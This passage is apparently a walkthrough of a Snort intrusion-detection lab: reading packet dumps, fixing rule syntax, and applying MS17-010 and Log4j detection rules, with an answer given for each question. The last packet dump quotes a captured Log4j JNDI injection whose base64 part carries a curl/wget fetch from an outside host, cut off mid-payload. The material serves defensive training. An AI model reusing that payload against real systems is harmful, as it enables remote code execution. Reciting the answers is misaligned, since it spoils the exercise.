=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+

WARNING: No preprocessors configured for policy 0.
07/03-07:54:42.551000 213.122.214.127:3904 -> 69.44.153.178:2710
TCP TTL:128 TOS:0x0 ID:22748 IpLen:20 DgmLen:390 DF
***AP*** Seq: 0xEA47AA16  Ack: 0xEE93DF8E  Win: 0x2238  TcpLen: 20
0x0000: BC DF 20 00 01 00 00 00 01 00 00 00 08 00 45 00  .. ...........E.
0x0010: 01 86 58 DC 40 00 80 06 15 BD D5 7A D6 7F 45 2C  ..X.@......z..E,
0x0020: 99 B2 0F 40 0A 96 EA 47 AA 16 EE 93 DF 8E 50 18  ...@...G......P.
0x0030: 22 38 18 91 00 00 47 45 54 20 2F 61 6E 6E 6F 75  "8....GET /annou
0x0040: 6E 63 65 3F 69 6E 66 6F 5F 68 61 73 68 3D 25 30  nce?info_hash=%0
0x0050: 31 64 25 46 45 25 37 45 25 46 31 25 31 30 25 35  1d%FE%7E%F1%10%5
0x0060: 43 57 76 41 70 25 45 44 25 46 36 25 30 33 25 43  CWvAp%ED%F6%03%C
0x0070: 34 39 25 44 36 42 25 31 34 25 46 31 26 70 65 65  49%D6B%14%F1&pee
0x0080: 72 5F 69 64 3D 25 42 38 6A 73 25 37 46 25 45 38  r_id=%B8js%7F%E8
0x0090: 25 30 43 25 41 46 68 25 30 32 59 25 39 36 37 25  %0C%AFh%02Y%967%
0x00A0: 32 34 65 25 32 37 56 25 45 45 4D 25 31 36 25 35  24e%27V%EEM%16%5
0x00B0: 42 26 70 6F 72 74 3D 34 31 37 33 30 26 75 70 6C  B&port=41730&upl
0x00C0: 6F 61 64 65 64 3D 30 26 64 6F 77 6E 6C 6F 61 64  oaded=0&download
0x00D0: 65 64 3D 30 26 6C 65 66 74 3D 33 37 36 37 38 36  ed=0&left=376786
0x00E0: 39 26 63 6F 6D 70 61 63 74 3D 31 26 69 70 3D 31  9&compact=1&ip=1
0x00F0: 32 37 2E 30 2E 30 2E 31 20 48 54 54 50 2F 31 2E  27.0.0.1 HTTP/1.
0x0100: 31 0D 0A 41 63 63 65 70 74 3A 20 61 70 70 6C 69  1..Accept: appli
0x0110: 63 61 74 69 6F 6E 2F 78 2D 62 69 74 74 6F 72 72  cation/x-bittorr
0x0120: 65 6E 74 0D 0A 41 63 63 65 70 74 2D 45 6E 63 6F  ent..Accept-Enco
0x0130: 64 69 6E 67 3A 20 67 7A 69 70 0D 0A 55 73 65 72  ding: gzip..User
0x0140: 2D 41 67 65 6E 74 3A 20 52 41 5A 41 20 32 2E 31  -Agent: RAZA 2.1
0x0150: 2E 30 2E 30 0D 0A 48 6F 73 74 3A 20 74 72 61 63  .0.0..Host: trac
0x0160: 6B 65 72 32 2E 74 6F 72 72 65 6E 74 62 6F 78 2E  ker2.torrentbox.
0x0170: 63 6F 6D 3A 32 37 31 30 0D 0A 43 6F 6E 6E 65 63  com:2710..Connec
0x0180: 74 69 6F 6E 3A 20 4B 65 65 70 2D 41 6C 69 76 65  tion: Keep-Alive
0x0190: 0D 0A 0D 0A                                      ....

=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
<---snip--->
```

Answer: application/x-bittorrent

#### What is the hostname of the torrent metafile?

```bash
ubuntu@ip-10-10-135-195:~/Desktop/Exercise-Files/TASK-5 (TorrentMetafile)$ sudo snort -X -r snort.log.1746788021 
Running in packet dump mode

        --== Initializing Snort ==--
Initializing Output Plugins!
pcap DAQ configured to read-file.
Acquiring network traffic from "snort.log.1746788021".
<---snip--->
=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+

WARNING: No preprocessors configured for policy 0.
07/03-07:54:42.551000 213.122.214.127:3904 -> 69.44.153.178:2710
TCP TTL:128 TOS:0x0 ID:22748 IpLen:20 DgmLen:390 DF
***AP*** Seq: 0xEA47AA16  Ack: 0xEE93DF8E  Win: 0x2238  TcpLen: 20
0x0000: BC DF 20 00 01 00 00 00 01 00 00 00 08 00 45 00  .. ...........E.
0x0010: 01 86 58 DC 40 00 80 06 15 BD D5 7A D6 7F 45 2C  ..X.@......z..E,
0x0020: 99 B2 0F 40 0A 96 EA 47 AA 16 EE 93 DF 8E 50 18  ...@...G......P.
0x0030: 22 38 18 91 00 00 47 45 54 20 2F 61 6E 6E 6F 75  "8....GET /annou
0x0040: 6E 63 65 3F 69 6E 66 6F 5F 68 61 73 68 3D 25 30  nce?info_hash=%0
0x0050: 31 64 25 46 45 25 37 45 25 46 31 25 31 30 25 35  1d%FE%7E%F1%10%5
0x0060: 43 57 76 41 70 25 45 44 25 46 36 25 30 33 25 43  CWvAp%ED%F6%03%C
0x0070: 34 39 25 44 36 42 25 31 34 25 46 31 26 70 65 65  49%D6B%14%F1&pee
0x0080: 72 5F 69 64 3D 25 42 38 6A 73 25 37 46 25 45 38  r_id=%B8js%7F%E8
0x0090: 25 30 43 25 41 46 68 25 30 32 59 25 39 36 37 25  %0C%AFh%02Y%967%
0x00A0: 32 34 65 25 32 37 56 25 45 45 4D 25 31 36 25 35  24e%27V%EEM%16%5
0x00B0: 42 26 70 6F 72 74 3D 34 31 37 33 30 26 75 70 6C  B&port=41730&upl
0x00C0: 6F 61 64 65 64 3D 30 26 64 6F 77 6E 6C 6F 61 64  oaded=0&download
0x00D0: 65 64 3D 30 26 6C 65 66 74 3D 33 37 36 37 38 36  ed=0&left=376786
0x00E0: 39 26 63 6F 6D 70 61 63 74 3D 31 26 69 70 3D 31  9&compact=1&ip=1
0x00F0: 32 37 2E 30 2E 30 2E 31 20 48 54 54 50 2F 31 2E  27.0.0.1 HTTP/1.
0x0100: 31 0D 0A 41 63 63 65 70 74 3A 20 61 70 70 6C 69  1..Accept: appli
0x0110: 63 61 74 69 6F 6E 2F 78 2D 62 69 74 74 6F 72 72  cation/x-bittorr
0x0120: 65 6E 74 0D 0A 41 63 63 65 70 74 2D 45 6E 63 6F  ent..Accept-Enco
0x0130: 64 69 6E 67 3A 20 67 7A 69 70 0D 0A 55 73 65 72  ding: gzip..User
0x0140: 2D 41 67 65 6E 74 3A 20 52 41 5A 41 20 32 2E 31  -Agent: RAZA 2.1
0x0150: 2E 30 2E 30 0D 0A 48 6F 73 74 3A 20 74 72 61 63  .0.0..Host: trac
0x0160: 6B 65 72 32 2E 74 6F 72 72 65 6E 74 62 6F 78 2E  ker2.torrentbox.
0x0170: 63 6F 6D 3A 32 37 31 30 0D 0A 43 6F 6E 6E 65 63  com:2710..Connec
0x0180: 74 69 6F 6E 3A 20 4B 65 65 70 2D 41 6C 69 76 65  tion: Keep-Alive
0x0190: 0D 0A 0D 0A                                      ....

=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
<---snip--->
```

Answer: tracker2.torrentbox.com

### Task 6 - Troubleshooting Rule Syntax Errors

Let's troubleshoot rule syntax errors!

In this section, you need to fix the syntax errors in the given rule files.

You can test each ruleset with the following command structure;

`sudo snort -c local-X.rules -r mx-1.pcap -A console`

Fix the syntax error in **local-1.rules** file and make it work smoothly.

#### What is the number of the detected packets?

Hint: Spaces matters!

```bash
ubuntu@ip-10-10-135-195:~/Desktop/Exercise-Files/TASK-6 (Troubleshooting)$ cat local-1.rules 
# ----------------
# LOCAL RULES
# ----------------
# This file intentionally does not come with signatures.  Put your local
# additions here.
alert tcp any 3372 -> any any (msg: "Troubleshooting 1"; sid:1000001; rev:1;)

ubuntu@ip-10-10-135-195:~/Desktop/Exercise-Files/TASK-6 (Troubleshooting)$ sudo snort -c local-1.rules -r mx-1.pcap -A console 2>/dev/null | wc -l
16
```

Answer: 16

Fix the syntax error in **local-2.rules** file and make it work smoothly.

#### What is the number of the detected packets?

Hint: Don't forget the ports! (any)

```bash
ubuntu@ip-10-10-135-195:~/Desktop/Exercise-Files/TASK-6 (Troubleshooting)$ cat local-2.rules 
# ----------------
# LOCAL RULES
# ----------------
# This file intentionally does not come with signatures.  Put your local
# additions here.
alert icmp any any -> any any (msg: "Troubleshooting 2"; sid:1000001; rev:1;)

ubuntu@ip-10-10-135-195:~/Desktop/Exercise-Files/TASK-6 (Troubleshooting)$ sudo snort -c local-2.rules -r mx-1.pcap -A console 2>/dev/null | wc -l
68
```

Answer: 68

Fix the syntax error in **local-3.rules** file and make it work smoothly.

#### What is the number of the detected packets?

Hint: SIDs should be unique!

```bash
ubuntu@ip-10-10-135-195:~/Desktop/Exercise-Files/TASK-6 (Troubleshooting)$ cat local-3.rules 
# ----------------
# LOCAL RULES
# ----------------
# This file intentionally does not come with signatures.  Put your local
# additions here.
alert icmp any any -> any any (msg: "ICMP Packet Found"; sid:1000001; rev:1;)
alert tcp any any -> any 80,443 (msg: "HTTPX Packet Found"; sid:1000002; rev:1;)

ubuntu@ip-10-10-135-195:~/Desktop/Exercise-Files/TASK-6 (Troubleshooting)$ sudo snort -c local-3.rules -r mx-1.pcap -A console 2>/dev/null | wc -l
87
```

Answer: 87

Fix the syntax error in **local-4.rules** file and make it work smoothly.

#### What is the number of the detected packets?

Hint: Semicolons matters!

```bash
ubuntu@ip-10-10-135-195:~/Desktop/Exercise-Files/TASK-6 (Troubleshooting)$ cat local-4.rules 
# -------------------
# LOCAL RULES
# -------------------
# This file intentionally does not come with signatures.  Put your local
# additions here.
alert icmp any any -> any any (msg: "ICMP Packet Found"; sid:1000001; rev:1;)
alert tcp any 80,443 -> any any (msg: "HTTPX Packet Found"; sid:1000002; rev:1;)

ubuntu@ip-10-10-135-195:~/Desktop/Exercise-Files/TASK-6 (Troubleshooting)$ sudo snort -c local-4.rules -r mx-1.pcap -A console 2>/dev/null | wc -l
90
```

Answer: 90

Fix the syntax error in **local-5.rules** file and make it work smoothly.

#### What is the number of the detected packets?

Hint: Direction and colons! (->)

```bash
ubuntu@ip-10-10-135-195:~/Desktop/Exercise-Files/TASK-6 (Troubleshooting)$ cat local-5.rules 
# ----------------
# LOCAL RULES
# ----------------
# This file intentionally does not come with signatures.  Put your local
# additions here.
alert icmp any any <> any any (msg: "ICMP Packet Found"; sid:1000001; rev:1;)
alert icmp any any -> any any (msg: "Inbound ICMP Packet Found"; sid:1000002; rev:1;)
alert tcp any any -> any 80,443 (msg: "HTTPX Packet Found"; sid:1000003; rev:1;)

ubuntu@ip-10-10-135-195:~/Desktop/Exercise-Files/TASK-6 (Troubleshooting)$ sudo snort -c local-5.rules -r mx-1.pcap -A console 2>/dev/null | wc -l
155
```

Answer: 155

Fix the logical error in **local-6.rules** file and make it work smoothly to create alerts.

#### What is the number of the detected packets?

Hint: Case sensitivity matters! Use the capitals or nocase!

```bash
ubuntu@ip-10-10-135-195:~/Desktop/Exercise-Files/TASK-6 (Troubleshooting)$ cat local-6.rules 
# -------------------
# LOCAL RULES
# -------------------
# This file intentionally does not come with signatures.  Put your local
# additions here.
alert tcp any any <> any 80  (msg: "GET Request Found"; content:"GET"; sid:100001; rev:1;)

ubuntu@ip-10-10-135-195:~/Desktop/Exercise-Files/TASK-6 (Troubleshooting)$ sudo snort -c local-6.rules -r mx-1.pcap -A console 2>/dev/null | wc -l
2
```

Answer: 2

Fix the logical error in **local-7.rules** file and make it work smoothly to create alerts.

#### What is the name of the required option

Hint: Rules without messages doesn't make sense!

```bash
ubuntu@ip-10-10-135-195:~/Desktop/Exercise-Files/TASK-6 (Troubleshooting)$ cat local-7.rules 
# ----------------
# LOCAL RULES
# ----------------
# This file intentionally does not come with signatures.  Put your local
# additions here.
alert tcp any any <> any 80  (msg: ".html extension found"; content:"|2E 68 74 6D 6C|"; sid:100001; rev:1;)

ubuntu@ip-10-10-135-195:~/Desktop/Exercise-Files/TASK-6 (Troubleshooting)$ sudo snort -c local-7.rules -r mx-1.pcap -A console 2>/dev/null | wc -l
9
```

Answer: msg

### Task 7 - Using External Rules (MS17-010)

Let's use external rules to fight against the latest threats!

Navigate to the task folder. Use the given pcap file.

Use the given rule file (local.rules) to investigate the ms1710 exploitation.

```bash
ubuntu@ip-10-10-135-195:~/Desktop/Exercise-Files/TASK-7 (MS17-10)$ cat local.rules 
# ----------------
# LOCAL RULES
# ----------------
# This file intentionally does not come with signatures.  Put your local
# additions here.
alert tcp any any -> any 445 (msg: "Exploit Detected!"; flow: to_server, established; pcre:"/|57 69 6e 64 6f 77 73 20 37 20 48 6f 6d 65 20 50|/"; pcre: "/|72 65 6d 69 75 6d 20 37 36 30 31 20 53 65 72 76|/"; pcre:"/|69 63 65 20 50 61 63 6b 20 31|/"; sid: 2094284; rev: 2;)
alert tcp any any -> any 445 (msg: "Exploit Detected!"; flow: to_server, established; content: "IPC$"; sid:2094285; rev: 3;)
alert tcp any any -> any 445 (msg: "Exploit Detected!"; flow: to_server, established; content: "NTLMSSP";sid: 2094286; rev: 2;) 
alert tcp any any -> any any (msg: "Exploit Detected!"; flow: to_server, established; content: "WindowsPowerShell";sid: 20244223; rev: 3;)
alert tcp any any -> any any (msg: "Exploit Detected!"; flow: to_server, established; content: "ADMIN$";sid:20244224; rev: 2;)
alert tcp any any -> any 445 (msg: "Exploit Detected!"; flow: to_server, established; content: "IPC$";sid: 20244225; rev:3;)
alert tcp any any -> any any (msg: "Exploit Detected!"; flow: to_server, established; content: "lsarpc";sid: 20244226; rev: 2;)
alert tcp any any -> any any (msg: "Exploit Detected!"; flow: to_server, established; content: "lsarpc";sid: 209462812; rev: 3;)
alert tcp any any -> any any (msg: "Exploit Detected!"; flow: to_server, established; content: "samr"; sid: 209462813; rev: 3;)
alert tcp any any -> any any (msg: "Exploit Detected!"; flow: to_server, established; content: "browser"; sid: 209462814; rev: 2;)
alert tcp any any -> any any (msg: "Exploit Detected!"; flow: to_server, established;content: "epmapper";sid: 209462815; rev: 2;)
alert tcp any any -> any any (msg: "Exploit Detected!"; flow: to_server, established; content: "eventlog"; sid: 209462816; rev: 2;)
alert tcp any any -> any 445 (msg: "Exploit Detected!"; flow:to_server, established; content: "/root/smbshare"; sid: 20242290; rev: 2;)
alert tcp any any -> any 445 (msg: "Exploit Detected!"; flow:to_server, established; content: "\\PIPE"; sid: 20242291; rev: 3;)
alert tcp any any -> any 445 (msg: "Exploit Detected!"; flow:to_server, established; content: "smbshare"; sid: 20242292; rev: 3;)
alert tcp any any -> any 445 (msg: "Exploit Detected!"; flow:to_server, established; content: "srvsvc"; sid: 20242293; rev: 2;)
alert tcp any any -> any 445 (msg:"OS-WINDOWS Microsoft Windows SMB remote code execution attempt"; flow:to_server,established; content:"|FF|SMB3|00 00 00 00|"; depth:9; offset:4; byte_extract:2,26,TotalDataCount,relative,little; byte_test:2,>,TotalDataCount,20,relative,little; metadata:policy balanced-ips drop, policy connectivity-ips drop, policy max-detect-ips drop, policy security-ips drop, ruleset community, service netbios-ssn; reference:cve,2017-0144; reference:cve,2017-0146; reference:url,blog.talosintelligence.com/2017/05/wannacry.html; reference:url,isc.sans.edu/forums/diary/ETERNALBLUE+Possible+Window+SMB+Buffer+Overflow+0Day/22304/; reference:url,technet.microsoft.com/en-us/security/bulletin/MS17-010; sid:41978; rev:5;)
alert tcp any any -> any 445 (msg:"OS-WINDOWS Microsoft Windows SMB remote code execution attempt"; flow:to_server,established; content:"|FF|SMB|A0 00 00 00 00|"; depth:9; offset:4; content:"|01 00 00 00 00|"; within:5; distance:59; byte_test:4,>,0x8150,-33,relative,little; metadata:policy balanced-ips drop, policy connectivity-ips drop, policy max-detect-ips drop, policy security-ips drop, ruleset community, service netbios-ssn; reference:cve,2017-0144; reference:cve,2017-0146; reference:url,isc.sans.edu/forums/diary/ETERNALBLUE+Possible+Window+SMB+Buffer+Overflow+0Day/22304/; reference:url,technet.microsoft.com/en-us/security/bulletin/MS17-010; sid:42944; rev:2;)
alert tcp any any -> any 445 (msg: "Exploit Detected!"; flow: to_server, established; pcre:"/|57 69 6e 64 6f 77 73 20 37 20 48 6f 6d 65 20 50|/"; pcre: "/|72 65 6d 69 75 6d 20 37 36 30 31 20 53 65 72 76|/"; pcre:"/|69 63 65 20 50 61 63 6b 20 31|/"; reference: ExploitDatabase (ID’s - 42030, 42031, 42315); priority: 10; sid: 2094284; rev: 2;)
```

#### What is the number of detected packets?

```bash
ubuntu@ip-10-10-135-195:~/Desktop/Exercise-Files/TASK-7 (MS17-10)$ sudo snort -c local.rules -A full -l . -r ms-17-010.pcap
<---snip--->
===============================================================================
Action Stats:
     Alerts:        25154 ( 53.916%)
     Logged:        25154 ( 53.916%)
<---snip--->
```

Answer: 25154

Clear the previous log and alarm files.

Use local-1.rules empty file to write a new rule to detect payloads containing the "\IPC$" keyword.

The rule becomes

```bash
ubuntu@ip-10-10-135-195:~/Desktop/Exercise-Files/TASK-7 (MS17-10)$ cat local-1.rules 
# ----------------
# LOCAL RULES
# ----------------
# This file intentionally does not come with signatures.  Put your local
# additions here.
alert tcp any any -> any 445 (msg: "IPC$ Share detected"; flow: to_server, established; content:"\\IPC$"; sid:3000001; rev:1;)
```

#### What is the number of detected packets?

Hint: The "content" option will help you to filter the payload.

```bash
ubuntu@ip-10-10-135-195:~/Desktop/Exercise-Files/TASK-7 (MS17-10)$ sudo snort -c local-1.rules -A full -l . -r ms-17-010.pcap 
<---snip--->
===============================================================================
Action Stats:
     Alerts:           12 (  0.026%)
     Logged:           12 (  0.026%)
     Passed:            0 (  0.000%)
<---snip--->
```

Answer: 12

#### Investigate the log/alarm files. What is the requested path?

Hint: Ends with "\IPC$"

```bash
ubuntu@ip-10-10-135-195:~/Desktop/Exercise-Files/TASK-7 (MS17-10)$ sudo snort -X -r snort.log.1746792949 
Running in packet dump mode

        --== Initializing Snort ==--
Initializing Output Plugins!
pcap DAQ configured to read-file.
Acquiring network traffic from "snort.log.1746792949".
<---snip--->
05/18-08:12:07.219861 192.168.116.149:49368 -> 192.168.116.138:445
TCP TTL:128 TOS:0x0 ID:575 IpLen:20 DgmLen:117 DF
***AP*** Seq: 0xFF7320A3  Ack: 0x223125FA  Win: 0xFF  TcpLen: 20
0x0000: 00 19 BB 4F 4C D8 00 25 B3 F5 FA 74 08 00 45 00  ...OL..%...t..E.
0x0010: 00 75 02 3F 40 00 80 06 8D D3 C0 A8 74 95 C0 A8  .u.?@.......t...
0x0020: 74 8A C0 D8 01 BD FF 73 20 A3 22 31 25 FA 50 18  t......s ."1%.P.
0x0030: 00 FF 57 09 00 00 00 00 00 49 FF 53 4D 42 75 00  ..W......I.SMBu.
0x0040: 00 00 00 18 01 20 00 00 00 00 00 00 00 00 00 00  ..... ..........
0x0050: 00 00 00 00 2F 4B 00 08 C5 5E 04 FF 00 00 00 00  ..../K...^......
0x0060: 00 01 00 1C 00 00 5C 5C 31 39 32 2E 31 36 38 2E  ......\\192.168.
0x0070: 31 31 36 2E 31 33 38 5C 49 50 43 24 00 3F 3F 3F  116.138\IPC$.???
0x0080: 3F 3F 00                                         ??.

=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
<---snip--->
```

Answer: `\\192.168.116.138\IPC$`

#### What is the CVSS v2 score of the MS17-010 vulnerability?

Hint: External search will help you to find the score!

From `https://nvd.nist.gov/vuln/detail/CVE-2017-0144`

Answer: 9.3

### Task 8 - Using External Rules (Log4j)

Let's use external rules to fight against the latest threats!

Navigate to the task folder. Use the given pcap file.

Use the given rule file (local.rules) to investigate the log4j exploitation.

```bash
ubuntu@ip-10-10-135-195:~/Desktop/Exercise-Files/TASK-8 (Log4j)$ cat local.rules 
# ----------------
# LOCAL RULES
# ----------------
# This file intentionally does not come with signatures.  Put your local
# additions here.
alert tcp any any -> any any (msg:"FOX-SRT – Exploit – Possible Apache Log4J RCE Request Observed (CVE-2021-44228)"; flow:established, to_server; content:"${jndi:ldap://"; fast_pattern:only; flowbits:set, fox.apachelog4j.rce; priority:3; reference:url, http://www.lunasec.io/docs/blog/log4j-zero-day/; metadata:CVE 2021-44228; metadata:created_at 2021-12-10; metadata:ids suricata; sid:21003726; rev:1;) 

alert tcp any any -> any any (msg:"FOX-SRT – Exploit – Possible Apache Log4J RCE Request Observed (CVE-2021-44228)"; flow:established, to_server; content:"${jndi:"; fast_pattern; pcre:"/\$\{jndi\:(rmi|ldaps|dns)\:/"; flowbits:set, fox.apachelog4j.rce; threshold:type limit, track by_dst, count 1, seconds 3600;  priority:3; reference:url, http://www.lunasec.io/docs/blog/log4j-zero-day/; metadata:CVE 2021-44228; metadata:created_at 2021-12-10; metadata:ids suricata; sid:21003728; rev:1;) 

alert tcp any any -> any any (msg:"FOX-SRT – Exploit – Possible Defense-Evasive Apache Log4J RCE Request Observed (CVE-2021-44228)"; flow:established, to_server; content:"${jndi:"; fast_pattern; content:!"ldap://"; flowbits:set, fox.apachelog4j.rce; threshold:type limit, track by_dst, count 1, seconds 3600;  priority:3; reference:url, http://www.lunasec.io/docs/blog/log4j-zero-day/; reference:url, twitter.com/stereotype32/status/1469313856229228544; metadata:CVE 2021-44228; metadata:created_at 2021-12-10; metadata:ids suricata; sid:21003730; rev:1;) 

alert tcp any any -> any any (msg:"FOX-SRT – Exploit – Possible Defense-Evasive Apache Log4J RCE Request Observed (URL encoded bracket) (CVE-2021-44228)"; flow:established, to_server; content:"%7bjndi:"; nocase; fast_pattern; flowbits:set, fox.apachelog4j.rce; threshold:type limit, track by_dst, count 1, seconds 3600;  priority:3; reference:url, http://www.lunasec.io/docs/blog/log4j-zero-day/; reference:url, https://twitter.com/testanull/status/1469549425521348609; metadata:CVE 2021-44228; metadata:created_at 2021-12-11; metadata:ids suricata; sid:21003731; rev:1;) 

alert tcp any any -> any any (msg:"FOX-SRT – Exploit – Possible Apache Log4j Exploit Attempt in HTTP Header"; flow:established, to_server; content:"${"; http_header; fast_pattern; content:"}"; http_header; distance:0; flowbits:set, fox.apachelog4j.rce.loose;  priority:3; threshold:type limit, track by_dst, count 1, seconds 3600; reference:url, http://www.lunasec.io/docs/blog/log4j-zero-day/; reference:url, https://twitter.com/testanull/status/1469549425521348609; metadata:CVE 2021-44228; metadata:created_at 2021-12-11; metadata:ids suricata; sid:21003732; rev:1;) 

alert tcp any any -> any any (msg:"FOX-SRT – Exploit – Possible Apache Log4j Exploit Attempt in URI"; flow:established,to_server; content:"${"; http_uri; fast_pattern; content:"}"; http_uri; distance:0; flowbits:set, fox.apachelog4j.rce.loose;  priority:3; threshold:type limit, track by_dst, count 1, seconds 3600; reference:url, http://www.lunasec.io/docs/blog/log4j-zero-day/; reference:url, https://twitter.com/testanull/status/1469549425521348609; metadata:CVE 2021-44228; metadata:created_at 2021-12-11; metadata:ids suricata; sid:21003733; rev:1;) 

# Better and stricter rules, also detects evasion techniques
alert tcp any any -> any any (msg:"FOX-SRT – Exploit – Possible Apache Log4j Exploit Attempt in HTTP Header (strict)"; flow:established,to_server; content:"${"; http_header; fast_pattern; content:"}"; http_header; distance:0; pcre:"/(\$\{\w+:.*\}|jndi)/Hi"; reference:url,www.lunasec.io/docs/blog/log4j-zero-day/; reference:url,https://twitter.com/testanull/status/1469549425521348609; metadata:CVE 2021-44228; metadata:created_at 2021-12-11; metadata:ids suricata; priority:3; sid:21003734; rev:1;) 

alert tcp any any -> any any (msg:"FOX-SRT – Exploit – Possible Apache Log4j Exploit Attempt in URI (strict)"; flow:established, to_server; content:"${"; http_uri; fast_pattern; content:"}"; http_uri; distance:0; pcre:"/(\$\{\w+:.*\}|jndi)/Ui"; reference:url,https://twitter.com/testanull/status/1469549425521348609; metadata:CVE 2021-44228; metadata:created_at 2021-12-11; metadata:ids suricata; priority:3; sid:21003735; rev:1;) 

alert tcp any any -> any any (msg:"FOX-SRT – Exploit – Possible Apache Log4j Exploit Attempt in Client Body (strict)"; flow:to_server; content:"${"; http_client_body; fast_pattern; content:"}"; http_client_body; distance:0; pcre:"/(\$\{\w+:.*\}|jndi)/Pi"; flowbits:set, fox.apachelog4j.rce.strict; reference:url,www.lunasec.io/docs/blog/log4j-zero-day/; reference:url,https://twitter.com/testanull/status/1469549425521348609; metadata:CVE 2021-44228; metadata:created_at 2021-12-12; metadata:ids suricata; priority:3; sid:21003744; rev:1;)
```

#### What is the number of detected packets?

```bash
ubuntu@ip-10-10-135-195:~/Desktop/Exercise-Files/TASK-8 (Log4j)$ sudo snort -c local.rules -A full -l . -r log4j.pcap 
<---snip--->
===============================================================================
Action Stats:
     Alerts:           26 (  0.057%)
     Logged:           26 (  0.057%)
<---snip--->
```

Answer: 26

#### Investigate the log/alarm files. How many rules were triggered?

Hint: You can investigate the alarm file with CLI commands (cat, grep). OR, you can read the snort output summary.

```bash
ubuntu@ip-10-10-135-195:~/Desktop/Exercise-Files/TASK-8 (Log4j)$ cat alert | grep -F '[**]' | sort -u
[**] [1:21003726:1] FOX-SRT – Exploit – Possible Apache Log4J RCE Request Observed (CVE-2021-44228) [**]
[**] [1:21003728:1] FOX-SRT – Exploit – Possible Apache Log4J RCE Request Observed (CVE-2021-44228) [**]
[**] [1:21003730:1] FOX-SRT – Exploit – Possible Defense-Evasive Apache Log4J RCE Request Observed (CVE-2021-44228) [**]
[**] [1:21003731:1] FOX-SRT – Exploit – Possible Defense-Evasive Apache Log4J RCE Request Observed (URL encoded bracket) (CVE-2021-44228) [**]
ubuntu@ip-10-10-135-195:~/Desktop/Exercise-Files/TASK-8 (Log4j)$ cat alert | grep -F '[**]' | sort -u | wc -l
4
```

Answer: 4

#### Investigate the log/alarm files. What are the first six digits of the triggered rule sids?

Hint: Starts with 21

```bash
ubuntu@ip-10-10-135-195:~/Desktop/Exercise-Files/TASK-8 (Log4j)$ cat alert | grep -F '[**]' | sort -u
[**] [1:21003726:1] FOX-SRT – Exploit – Possible Apache Log4J RCE Request Observed (CVE-2021-44228) [**]
[**] [1:21003728:1] FOX-SRT – Exploit – Possible Apache Log4J RCE Request Observed (CVE-2021-44228) [**]
[**] [1:21003730:1] FOX-SRT – Exploit – Possible Defense-Evasive Apache Log4J RCE Request Observed (CVE-2021-44228) [**]
[**] [1:21003731:1] FOX-SRT – Exploit – Possible Defense-Evasive Apache Log4J RCE Request Observed (URL encoded bracket) (CVE-2021-44228) [**]
```

Answer: 210037

Clear the previous log and alarm files.

Use local-1.rules empty file to write a new rule to detect packet payloads **between 770 and 855 bytes**.

The new rule is:

```bash
ubuntu@ip-10-10-135-195:~/Desktop/Exercise-Files/TASK-8 (Log4j)$ cat local-1.rules 
# ----------------
# LOCAL RULES
# ----------------
# This file intentionally does not come with signatures.  Put your local
# additions here.
alert tcp any any <> any any (msg: "Packet Size Case"; dsize:770<>855; sid:3000002; rev:1;)
```

#### What is the number of detected packets?

Hint: The "dsize" option will help you to filter the payload size.

```bash
ubuntu@ip-10-10-135-195:~/Desktop/Exercise-Files/TASK-8 (Log4j)$ sudo snort -c local-1.rules -A full -l . -r log4j.pcap
<---snip--->
===============================================================================
Action Stats:
     Alerts:           41 (  0.089%)
     Logged:           41 (  0.089%)
     Passed:            0 (  0.000%)
<---snip--->
```

**Note**: The question didn't say anything about **TCP** packets  but since IP didn't work I tried TCP instead!?

Answer: 41

#### Investigate the log/alarm files. What is the name of the used encoding algorithm?

```bash
ubuntu@ip-10-10-135-195:~/Desktop/Exercise-Files/TASK-8 (Log4j)$ sudo snort -X -r snort.log.1746794726 
Running in packet dump mode

        --== Initializing Snort ==--
Initializing Output Plugins!
pcap DAQ configured to read-file.
Acquiring network traffic from "snort.log.1746794726".
<---snip--->
=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+

WARNING: No preprocessors configured for policy 0.
12/12-05:06:07.579734 45.155.205.233:39692 -> 198.71.247.91:80
TCP TTL:53 TOS:0x0 ID:62808 IpLen:20 DgmLen:827
***AP*** Seq: 0xDC9A621B  Ack: 0x9B92AFC8  Win: 0x1F6  TcpLen: 32
TCP Options (3) => NOP NOP TS: 1584792788 1670627000 
0x0000: 00 16 3C F1 FD 6D 64 9E F3 BE DB 66 08 00 45 00  ..<..md....f..E.
0x0010: 03 3B F5 58 00 00 35 06 D4 3C 2D 9B CD E9 C6 47  .;.X..5..<-....G
0x0020: F7 5B 9B 0C 00 50 DC 9A 62 1B 9B 92 AF C8 80 18  .[...P..b.......
0x0030: 01 F6 1F 4F 00 00 01 01 08 0A 5E 76 04 D4 63 93  ...O......^v..c.
0x0040: BE B8 47 45 54 20 2F 3F 78 3D 24 7B 6A 6E 64 69  ..GET /?x=${jndi
0x0050: 3A 6C 64 61 70 3A 2F 2F 34 35 2E 31 35 35 2E 32  :ldap://45.155.2
0x0060: 30 35 2E 32 33 33 3A 31 32 33 34 34 2F 42 61 73  05.233:12344/Bas
0x0070: 69 63 2F 43 6F 6D 6D 61 6E 64 2F 42 61 73 65 36  ic/Command/Base6
0x0080: 34 2F 4B 47 4E 31 63 6D 77 67 4C 58 4D 67 4E 44  4/KGN1cmwgLXMgND
0x0090: 55 75 4D 54 55 31 4C 6A 49 77 4E 53 34 79 4D 7A  UuMTU1LjIwNS4yMz
0x00A0: 4D 36 4E 54 67 33 4E 43 38 78 4E 6A 49 75 4D 43  M6NTg3NC8xNjIuMC
0x00B0: 34 79 4D 6A 67 75 4D 6A 55 7A 4F 6A 67 77 66 48  4yMjguMjUzOjgwfH
0x00C0: 78 33 5A 32 56 30 49 43 31 78 49 43 31 50 4C 53  x3Z2V0IC1xIC1PLS
0x00D0: 41 30 4E 53 34 78 4E 54 55 75 4D 6A 41 31 4C 6A  A0NS4xNTUuMjA1Lj
